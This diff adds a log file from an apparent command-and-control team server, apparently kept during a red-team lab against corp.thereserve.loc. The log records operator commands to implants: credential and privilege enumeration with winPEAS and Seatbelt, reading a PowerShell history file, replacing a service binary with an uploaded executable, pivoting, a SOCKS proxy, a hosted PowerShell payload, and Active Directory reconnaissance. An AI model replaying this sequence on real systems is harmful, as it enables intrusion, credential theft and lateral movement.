@@ -1,0 +1,161 @@
+24/05/2023 02:02:17 | Info | User | Fropops-e0e55d4d-8660-4a6e-a562-d517bc17ee1e |  | Exit TeamServer
+24/05/2023 02:07:46 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 |  | Connexion to TeamServer
+24/05/2023 02:07:48 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 |  | Connexion to TeamServer
+24/05/2023 02:56:16 | Info | Agent | 84925fb763 |  | Agent Checking In
+24/05/2023 02:56:28 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 84925fb763 | Command tasked to agent : terminate
+24/05/2023 03:06:23 | Info | Agent | bc055cd8ba |  | Agent Checking In
+24/05/2023 03:15:03 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | bc055cd8ba | Command tasked to agent : terminate
+24/05/2023 03:21:07 | Info | Agent | 0dbbecba5a |  | Agent Checking In
+24/05/2023 03:21:15 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : whoami
+24/05/2023 03:23:25 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : ls
+24/05/2023 03:23:51 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : shell type spam.txt
+24/05/2023 03:24:08 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : shell type spam.txt
+24/05/2023 03:24:20 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : shell whoami
+24/05/2023 03:24:30 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : cat spam.txt
+24/05/2023 03:24:46 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : ls
+24/05/2023 03:46:01 | Info | Agent | ae6f04dcd9 |  | Agent Checking In
+24/05/2023 04:01:48 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : sleep 60
+24/05/2023 04:02:27 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | ae6f04dcd9 | Command tasked to agent : sleep 2
+24/05/2023 04:05:53 | Info | Agent | 0dbbecba5a |  | Agent Checking In
+24/05/2023 04:05:58 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : sleep 2
+24/05/2023 04:17:45 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : whoami
+24/05/2023 04:17:55 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : migrate
+24/05/2023 04:18:12 | Info | Agent | 174f0f3098 |  | Agent Checking In
+24/05/2023 04:18:26 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 0dbbecba5a | Command tasked to agent : sleep 60
+24/05/2023 04:18:41 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : pwd
+24/05/2023 04:18:49 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell dir
+24/05/2023 04:46:49 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : download script_emily.py
+24/05/2023 04:48:12 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : pwd
+24/05/2023 04:48:19 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : cd  c:\users
+24/05/2023 04:48:27 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell dir
+24/05/2023 04:49:19 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : cd emily.harvey
+24/05/2023 04:49:21 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : ls
+24/05/2023 04:49:28 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : cd desktop
+24/05/2023 04:49:33 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : ls
+24/05/2023 04:50:04 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell whoami /priv
+24/05/2023 04:52:13 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/Seatbelt.exe
+24/05/2023 04:52:26 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/Seatbelt.exe
+24/05/2023 04:52:49 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/Seatbelt.exe -group=system
+24/05/2023 04:54:02 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe
+24/05/2023 04:54:23 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe
+24/05/2023 04:54:41 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe
+24/05/2023 04:55:22 | Info | Agent | 5485dbe94c |  | Agent Checking In
+24/05/2023 04:55:47 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 5485dbe94c | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe userinfo
+24/05/2023 04:56:37 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell systeminfo
+24/05/2023 04:57:01 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe userinfo
+24/05/2023 04:58:15 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe quiet filesinfo
+24/05/2023 04:59:18 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : ps
+24/05/2023 05:02:56 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : cd "C:\Backup Service\Full Backup\backup.exe"
+24/05/2023 05:03:04 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : cd "C:\Backup Service\Full Backup\"
+24/05/2023 05:03:13 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : ls
+24/05/2023 05:03:36 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell copy backup.exe backup.exe.bak
+24/05/2023 05:03:44 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : ls
+24/05/2023 05:04:33 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : pivot start -b pipe://127.0.0.1:local
+24/05/2023 05:04:42 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : pivot show
+24/05/2023 05:05:06 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : migrate -b pipe://127.0.0.1:local
+24/05/2023 05:05:10 | Info | Agent | e2a3f1726c |  | Agent Checking In
+24/05/2023 05:05:16 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | e2a3f1726c | Command tasked to agent : terminate
+24/05/2023 05:06:22 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | e2a3f1726c | Command tasked to agent : upload back.exe
+24/05/2023 05:06:27 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | e2a3f1726c | Command tasked to agent : ls
+24/05/2023 05:06:59 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : pwd
+24/05/2023 05:07:03 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : upload back.exe
+24/05/2023 05:07:14 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : ls
+24/05/2023 05:07:26 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell del backup.exe
+24/05/2023 05:07:34 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell move bacl.exe backup.exe
+24/05/2023 05:07:41 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : shell move back.exe backup.exe
+24/05/2023 05:07:46 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : ls
+24/05/2023 05:08:49 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe quiet systeminfo
+24/05/2023 05:10:28 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : cat C:\Users\emily.harvey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+24/05/2023 05:11:39 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe quiet
+24/05/2023 05:12:05 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe -h
+24/05/2023 05:12:29 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe servicesinfo
+24/05/2023 05:13:42 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe quiet networkinfo
+24/05/2023 05:15:40 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe quiet domain
+24/05/2023 05:17:45 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe quiet windowscreds
+24/05/2023 05:18:31 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/privesc/winPEASany.exe quiet browserinfo
+24/05/2023 05:19:54 | Info | User | Fropops-6ab3f97a-a8f3-4989-8469-ff554c01d923 |  | Exit TeamServer
+24/05/2023 05:20:12 | Info | User | Fropops-ca0108c1-37bf-44b5-8b40-58f40a2ecee1 |  | Connexion to TeamServer
+24/05/2023 05:20:13 | Info | User | Fropops-ca0108c1-37bf-44b5-8b40-58f40a2ecee1 |  | Connexion to TeamServer
+24/05/2023 05:22:02 | Info | User | Fropops-ca0108c1-37bf-44b5-8b40-58f40a2ecee1 | 174f0f3098 | Command tasked to agent : powershell-import /mnt/Share/Utils/win/AD/PowerView.ps1
+24/05/2023 05:23:07 | Info | User | Fropops-ca0108c1-37bf-44b5-8b40-58f40a2ecee1 |  | Exit TeamServer
+24/05/2023 05:24:55 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e |  | Connexion to TeamServer
+24/05/2023 05:24:56 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e |  | Connexion to TeamServer
+24/05/2023 05:48:59 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-Domain
+24/05/2023 05:49:28 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-Domain
+24/05/2023 05:49:42 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : shell whoami
+24/05/2023 05:49:54 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-Domain -doamin corp
+24/05/2023 05:50:05 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-Domain -domain corp
+24/05/2023 05:51:56 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-Domain corp.thereserve.loc
+24/05/2023 05:52:08 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-Domain -domain corp.thereserve.loc
+24/05/2023 05:52:17 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : shell net user
+24/05/2023 05:53:09 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-ForestDomain
+24/05/2023 05:53:20 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-DomainUser
+24/05/2023 05:53:38 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-DomainUser -domain corp.thereserve.loc
+24/05/2023 05:56:10 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell-import /mnt/Share/tmp/PowerView.ps1
+24/05/2023 05:56:19 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-Domain
+24/05/2023 05:56:55 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-ForestDomain
+24/05/2023 05:57:11 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-DomainUser -domain corp.thereserve.loc
+24/05/2023 05:57:19 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : powershell Get-DomainUser
+24/05/2023 05:59:44 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/SharpHound.exe -c All -d corp.thereserve.loc --outputprefix frop
+24/05/2023 06:01:23 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : whoami
+24/05/2023 06:01:35 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/SharpHound.exe -c All -d corp --outputprefix frop
+24/05/2023 06:02:27 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : shell ipconfig
+24/05/2023 06:02:41 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 174f0f3098 | Command tasked to agent : shell hostname
+24/05/2023 07:52:12 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 5485dbe94c | Command tasked to agent : kill 5485dbe94c
+24/05/2023 07:53:06 | Info | Agent | 4c4d9fa596 |  | Agent Checking In
+24/05/2023 07:53:14 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 4c4d9fa596 | Command tasked to agent : migrate
+24/05/2023 07:53:24 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 4c4d9fa596 | Command tasked to agent : ps
+24/05/2023 07:53:30 | Info | Agent | 29faadc8e3 |  | Agent Checking In
+24/05/2023 07:53:52 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 29faadc8e3 | Command tasked to agent : sleep 0
+24/05/2023 07:54:04 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 29faadc8e3 | Command tasked to agent : proxy start -p 1080
+24/05/2023 07:56:05 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 29faadc8e3 | Command tasked to agent : service
+24/05/2023 07:56:46 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 29faadc8e3 | Command tasked to agent : proxy stop
+24/05/2023 08:01:05 | Info | Agent | 3b0daca58b |  | Agent Checking In
+24/05/2023 08:02:24 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 3b0daca58b | Command tasked to agent : migrate
+24/05/2023 08:02:38 | Info | Agent | 354edb6907 |  | Agent Checking In
+24/05/2023 08:02:55 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 354edb6907 | Command tasked to agent : sleep 0
+24/05/2023 08:03:05 | Info | Agent | 39be9ef11a |  | Agent Checking In
+24/05/2023 08:03:26 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 39be9ef11a | Command tasked to agent : migrate
+24/05/2023 08:03:39 | Info | Agent | cf67917e0e |  | Agent Checking In
+24/05/2023 08:03:47 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 39be9ef11a | Command tasked to agent : ps
+24/05/2023 08:04:14 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 39be9ef11a | Command tasked to agent : migrate -pid 3152
+24/05/2023 08:04:25 | Info | Agent | b153de0666 |  | Agent Checking In
+24/05/2023 08:04:42 | Info | Agent | 39be9ef11a |  | Agent Checking In
+24/05/2023 08:04:42 | Info | Agent | cf67917e0e |  | Agent Checking In
+24/05/2023 08:05:01 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 39be9ef11a | Command tasked to agent : ps
+24/05/2023 08:10:58 | Info | Agent | 8fe22d812d |  | Agent Checking In
+24/05/2023 08:11:05 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 8fe22d812d | Command tasked to agent : ps
+24/05/2023 08:12:08 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 8fe22d812d | Command tasked to agent : migrate
+24/05/2023 08:12:20 | Info | Agent | d59531aef0 |  | Agent Checking In
+24/05/2023 08:12:21 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 8fe22d812d | Command tasked to agent : ps
+24/05/2023 08:16:56 | Info | Agent | 9fddba833c |  | Agent Checking In
+24/05/2023 08:17:04 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : ps
+24/05/2023 08:21:29 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : sleep 0
+24/05/2023 08:21:38 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : proxy start -p 1080
+24/05/2023 08:34:47 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : shell hostname
+24/05/2023 08:34:50 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : shell ipconfig
+24/05/2023 09:50:49 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e |  | Web hosting a - Payload PowerShell x64 https://10.50.118.117:443
+24/05/2023 09:53:04 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e |  | Web hosting a - Payload PowerShell x64 https://10.50.118.117:443
+24/05/2023 09:53:34 | Info | Agent | 0d95a249b4 |  | Agent Checking In
+24/05/2023 09:53:43 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : whoami
+24/05/2023 09:54:21 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell-import /mnt/Share/Utils/win/AD/PowerView.ps1
+24/05/2023 09:54:33 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-Domain
+24/05/2023 10:25:56 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : whoami
+24/05/2023 10:32:17 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : cd C:\Windows\Temp\
+24/05/2023 10:32:42 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : shell echo db6270cf-56ca-48db-96d8-e2fcb7300ce5 > Fropops.txt
+24/05/2023 10:32:46 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : ls
+24/05/2023 10:32:56 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : shell dir
+24/05/2023 10:33:05 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 9fddba833c | Command tasked to agent : pwd
+24/05/2023 10:43:46 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-Domain
+24/05/2023 10:51:54 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainSID
+24/05/2023 11:02:22 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainController | select Forest, Name, OSVersion | fl
+24/05/2023 11:03:07 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainController  -Domain corp.thereserve.loc | select Forest, Name, OSVersion | fl
+24/05/2023 11:03:19 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainController -Domain thereserve.loc | select Forest, Name, OSVersion | fl
+24/05/2023 11:04:04 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainPolicyData | select -expand SystemAccess
+24/05/2023 11:04:25 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainPolicyData -Domain corp.thereserve.loc | select -expand SystemAccess
+24/05/2023 11:05:14 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-ForestDomain
+24/05/2023 11:06:19 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-ForestDomain -Domain corp.thereserve.loc
+24/05/2023 11:15:13 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
+24/05/2023 11:21:07 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainUser -Properties samaccountname, MemberOf | format-table
+24/05/2023 11:27:44 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainGroup
+24/05/2023 11:30:13 | Info | User | Fropops-f5f04729-1088-4870-942c-3f46783ee39e | 0d95a249b4 | Command tasked to agent : powershell Get-DomainGroup -Properties samaccountname, description | ft
